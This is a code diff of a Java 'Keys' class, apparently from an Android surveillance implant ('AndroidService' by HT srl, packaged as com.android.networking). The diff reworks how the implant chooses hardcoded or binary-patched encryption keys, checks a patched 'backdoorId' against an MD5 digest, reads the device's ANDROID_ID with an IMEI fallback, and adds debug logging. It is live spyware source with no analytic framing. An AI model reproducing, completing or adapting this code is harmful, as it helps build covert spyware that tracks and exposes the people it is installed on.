@@ -1,5 +1,5 @@
 /* *********************************************
- * Create by : Alberto "Quequero" Pelliccione
+ * Create by : Alberto "Q" Pelliccione
  * Company   : HT srl
  * Project   : AndroidService
  * Created   : 01-dec-2010
@@ -29,7 +29,7 @@ import com.android.networking.R;
 public class Keys {
 	private static final String TAG = "Keys"; //$NON-NLS-1$
 	/** The singleton. */
-	private volatile static Keys singleton;
+	private static Keys singleton;
 	private static int keyLen = 16;
 
 	// Subversion
@@ -68,6 +68,7 @@ public class Keys {
 	// Random seed
 	private static byte[] randomSeed;
 
+	private static Object keysLock = new Object();
 
 	/**
 	 * Self.
@@ -76,18 +77,25 @@ public class Keys {
 	 */
 	public static Keys self() {
 		if (singleton == null) {
-			synchronized (Keys.class) {
+			synchronized (keysLock) {
 				if (singleton == null) {
 					if (Cfg.KEYS) {
-						singleton = new KeysFake();
-
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " Using hardcoded keys");
+						singleton = new Keys(true);
+						if(!singleton.hasBeenBinaryPatched()){
+							if (Cfg.DEBUGKEYS) {
+								Check.log(TAG + " Using hardcoded keys");
+							}
+							singleton = new KeysFake();
+						}else{
+							if (Cfg.DEBUGKEYS) {
+								Check.log(TAG + " Using binary patched keys");
+							}
 						}
+						
 					} else {
 						singleton = new Keys(true);
 
-						if (Cfg.DEBUG) {
+						if (Cfg.DEBUGKEYS) {
 							Check.log(TAG + " Using binary patched keys");
 						}
 					}
@@ -100,12 +108,16 @@ public class Keys {
 
 
 	protected Keys(boolean fromResources) {
+		if (Cfg.DEBUGKEYS) {
+			Check.log(TAG + " keys " + fromResources);
+		}
 		String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
 		if (androidId == null) {
 			androidId = "EMPTY";
 		}
 
-		if (Messages.getString("20.0").equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
+		//20.0=9774d56d682e549c Messages.getString("20.0")
+		if ("9774d56d682e549c".equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
 			// http://code.google.com/p/android/issues/detail?id=10603
 			// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
 			final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
@@ -115,7 +127,7 @@ public class Keys {
 			androidId = imei;
 		}
 
-		if (Cfg.DEBUG) {
+		if (Cfg.DEBUGKEYS) {
 			Check.log(TAG + " (Keys), androidId: " + androidId);
 		}
 
@@ -197,11 +209,14 @@ public class Keys {
 	 * @return true, if successful
 	 */
 	public boolean hasBeenBinaryPatched() {
-		// EMp7Ca7-fpOBIr md5=c705fb9161f633c98f02ed4cbda03348		
-		byte[] bDigest = Utils.hexStringToByteArray("c705fb9161f633c98f02ed4cbda03348");		
+		// EMp7Ca7-fpOBIr md5=b1688ffaaaafd7c1cab52e630b53178f		
+		byte[] bDigest = Utils.hexStringToByteArray("b1688ffaaaafd7c1cab52e630b53178f");		
 		byte[] calculated = Digest.MD5(backdoorId);
 
-		boolean ret = Arrays.equals(calculated, bDigest);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (hasBeenBinaryPatched) calculated MD5: " + Utils.byteArrayToHex(calculated));
+		}
+		boolean ret = !Arrays.equals(calculated, bDigest);
 		return ret;
 	}
 
@@ -264,7 +279,7 @@ public class Keys {
 		}
 	}
 
-	private byte[] keyFromString(byte[] resource, int from, int len) {
+	private static byte[] keyFromString(byte[] resource, int from, int len) {
 		final byte[] res = Utils.copy(resource, from, len);
 		byte[] ret = keyFromString(new String(res));
 
@@ -275,7 +290,7 @@ public class Keys {
 		}
 	}
 
-	private byte[] keyFromString(final String string) {
+	private static byte[] keyFromString(final String string) {
 		try {
 			final byte[] array = new byte[keyLen];
 
